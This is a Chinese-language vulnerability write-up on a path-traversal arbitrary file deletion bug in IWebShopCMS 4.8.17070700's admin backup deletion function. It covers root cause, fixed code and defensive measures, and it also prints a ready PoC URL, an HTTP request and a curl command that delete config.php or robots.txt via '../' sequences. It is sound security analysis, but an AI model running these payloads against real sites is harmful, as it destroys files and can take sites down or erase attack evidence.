---
title: IWebShopCMS 4.8.17070700 后台备份功能任意文件删除漏洞分析
description: 深度分析 IWebShopCMS 后台数据库备份管理功能中因路径遍历导致的任意文件删除漏洞，包含漏洞复现流程、代码审计溯源、PoC 构造及修复代码对比。
category: program-analysis
tags:
- IWebShopCMS
- 任意文件删除
- 路径遍历
- 代码审计
- CMS漏洞
- 后台漏洞
- 漏洞复现
- PHP安全
date: 2024-01-15
updated: '2026-11-15'
---

## 漏洞概况

| 属性 | 详情 |
|------|------|
| **漏洞名称** | IWebShopCMS 后台任意文件删除漏洞 |
| **影响版本** | 4.8.17070700 |
| **漏洞类型** | 路径遍历 / 任意文件删除 |
| **危害等级** | 高危 |
| **攻击向量** | 后台数据库备份管理功能 |
| **利用条件** | 需要后台管理员权限 |
| **漏洞文件** | `/WWW/classes/dbbackup.php` |
| **漏洞函数** | `del` 方法（第 196 行） |

## 漏洞原理分析

### 核心成因

IWebShopCMS 基于 iweb SI 框架开发，其后台数据库管理功能提供备份文件下载与删除操作。在 `dbbackup.php` 的 `del` 方法中，**未对用户传入的 `name` 参数进行路径规范化与安全校验**，直接拼接至文件系统路径执行删除操作，导致攻击者可通过 `../` 目录遍历序列跳出备份目录，删除 Web 根目录下任意文件。

### 代码溯源

定位漏洞文件 `/WWW/classes/dbbackup.php` 第 196 行 `del` 方法：

```php
// 修复前（伪代码还原）
public function del() {
    $name = $_GET['name']; // 或 $_POST['name']
    // 缺失：路径规范化、目录穿越检测、白名单校验
    @unlink($backup_dir . '/' . $name[0]);
}
```

**关键缺陷点**：
1. **无路径规范化**：未使用 `realpath()` 或 `basename()` 限制文件名
2. **无目录边界检查**：未验证解析后路径是否在备份目录内
3. **直接拼接删除**：用户输入直接进入 `unlink()` 系统调用

## 漏洞复现流程

### 环境准备

- IWebShopCMS 4.8.17070700
- 后台管理员账号（或已获取后台会话）

### PoC 构造

**漏洞 URL**：
```
http://target.com/index.php?controller=tools&action=backup_del&name[0]=../../config/config.php
```

**HTTP 请求示例**：
```
GET /index.php?controller=tools&action=backup_del&name[0]=../../config/config.php HTTP/1.1
Host: target.com
Cookie: admin_session=xxx; PHPSESSID=yyy
```

### 验证步骤

1. **确认目标文件存在**：访问后台或通过其他途径确认 `config/config.php` 存在
2. **发送恶意请求**：携带管理员 Cookie 访问上述 URL
3. **验证删除结果**：再次检查 `config/config.php` 是否已被删除，或尝试访问前台触发报错

### 复现截图要点

- 请求包修改：将 `name[0]` 参数值设为 `../../config/config.php`
- 响应包：返回删除成功提示
- 文件系统：目标配置文件消失，站点瘫痪

## 影响与危害

| 影响维度 | 说明 |
|----------|------|
| **站点瘫痪** | 删除核心配置文件（`config.php`）、入口文件（`index.php`）、框架核心类导致全站不可用 |
| **数据破坏** | 可删除数据库备份文件、上传目录文件、日志文件等 |
| **拒绝服务** | 批量删除关键文件造成持久性 DoS，需从备份恢复 |
| **掩盖痕迹** | 攻击者可删除 WebShell、访问日志、错误日志等攻击证据 |

## 修复方案

### 官方修复代码对比

**修复后 `/WWW/classes/dbbackup.php` 第 196 行**：

```php
public function del() {
    $name = IReq::get('name'); // 框架封装的输入获取
    
    // 新增：判断文件是否存在，不存在则退出
    if (!is_file($this->backup_dir . '/' . $name[0])) {
        IError::show(403, '文件不存在');
    }
    
    // 新增：路径安全校验（建议补充）
    $real_path = realpath($this->backup_dir . '/' . $name[0]);
    $real_backup_dir = realpath($this->backup_dir);
    if (strpos($real_path, $real_backup_dir) !== 0) {
        IError::show(403, '非法文件路径');
    }
    
    @unlink($real_path);
    $this->message('删除成功', 'back');
}
```

### 完整修复建议

```php
public function del() {
    $names = IReq::get('name', 'array'); // 强制数组类型
    
    foreach ($names as $name) {
        // 1. 基础文件名校验：仅允许字母数字、下划线、点、连字符
        if (!preg_match('/^[\w\.\-]+$/', $name)) {
            continue; // 或记录日志跳过
        }
        
        // 2. 路径规范化
        $file_path = $this->backup_dir . DIRECTORY_SEPARATOR . $name;
        $real_file = realpath($file_path);
        $real_backup = realpath($this->backup_dir);
        
        // 3. 目录边界检查：确保在备份目录内
        if (!$real_file || strpos($real_file, $real_backup) !== 0) {
            IError::show(403, '非法文件路径: ' . htmlspecialchars($name));
            return;
        }
        
        // 4. 确认是文件而非目录
        if (!is_file($real_file)) {
            continue;
        }
        
        // 5. 执行删除
        @unlink($real_file);
    }
    
    $this->message('删除成功', 'back');
}
```

### 防御层面补充

| 防御层面 | 措施 |
|----------|------|
| **输入验证** | 白名单正则限制文件名字符集，拒绝 `..`、`/`、`\` |
| **路径规范化** | `realpath()` 解析真实路径，配合 `strpos()` 检查目录边界 |
| **最小权限** | Web 进程以低权限用户运行，备份目录仅授予必要读写权限 |
| **操作审计** | 记录删除操作日志（操作人、文件名、时间、IP） |
| **备份保护** | 关键配置文件设置不可变属性（`chattr +i`）或异地备份 |

## 关联漏洞与对比分析

### 同类 CMS 任意文件删除漏洞

| CMS | 漏洞页面 | 核心相似点 |
|-----|----------|------------|
| **飞飞CMS** | [[feifei-cms-arbitrary-file-deletion]] | 后台数据库恢复功能 `delall()` 缺失路径校验，同为备份管理模块 |
| **HDWiki** | [[arbitrary-file-download-vulnerability-analysis]] | 后台数据库备份 `admin_db.php` 存在任意文件下载与删除，利用链相似 |

### 通用代码审计模式

> 参见 [[arbitrary-file-download-vulnerability-analysis#通用代码审计模式与修复方案]] 章节

1. **危险函数追踪**：`unlink()`、`delete()`、`remove()`、`File::delete()`
2. **用户输入源头**：`$_GET`、`$_POST`、`$_REQUEST`、框架封装输入类
3. **路径拼接点**：变量直接拼接至文件系统路径
4. **缺失校验点**：
   - `basename()` / `pathinfo()` 取文件名
   - `realpath()` 规范化路径
   - `strpos($real_path, $allow_dir) === 0` 目录边界检查
   - 白名单正则 `preg_match('/^[\w\.\-]+$/', $filename)`

## 检测与利用工具

### 手工验证脚本

```bash
# 简单验证（需有效 Cookie）
curl -b "admin_session=xxx; PHPSESSID=yyy" \
  "http://target.com/index.php?controller=tools&action=backup_del&name[0]=../../robots.txt"
```

### 批量检测思路

1. 爬取后台备份管理页面
2. 提取 `backup_del` 接口
3. 尝试删除可控文件（如上传测试文件）
4. 验证文件是否被删除

## 时间线

| 日期 | 事件 |
|------|------|
| 2017-07-07 | 版本 4.8.17070700 发布（版本号含日期） |
| 2018-12-11 | 微信公众号文章发布，漏洞公开 |
| 修复发布 | 官方后续版本修复 `dbbackup.php` 第 196 行 |

## 参考资源

- 原文链接：[IWebShopCMS后台存在任意删除文件](http://mp.weixin.qq.com/s?__biz=MzI4MDE5ODExNQ==&mid=2652901355&idx=1&sn=f6d0dc2407845eaa6deb1f2cc23b8b21)
- 同类漏洞分析：[[feifei-cms-arbitrary-file-deletion]]、[[arbitrary-file-download-vulnerability-analysis]]
- PHP 文件操作安全：[[php-file-inclusion-vulnerability]]、[[php-webshell-fundamentals-chopper-analysis]]

## 小结

IWebShopCMS 此漏洞典型体现了 **CMS 后台功能模块对用户输入路径参数缺乏边界校验** 的通用问题。修复核心在于：**输入白名单过滤 + `realpath()` 路径规范化 + 目录边界强制约束**。代码审计时重点关注备份管理、文件管理、模板编辑等涉及文件系统操作的后台功能模块。

## 来源

- [226安全团队-201805-202103_43](../sources/226安全团队-201805-202103_43.md)
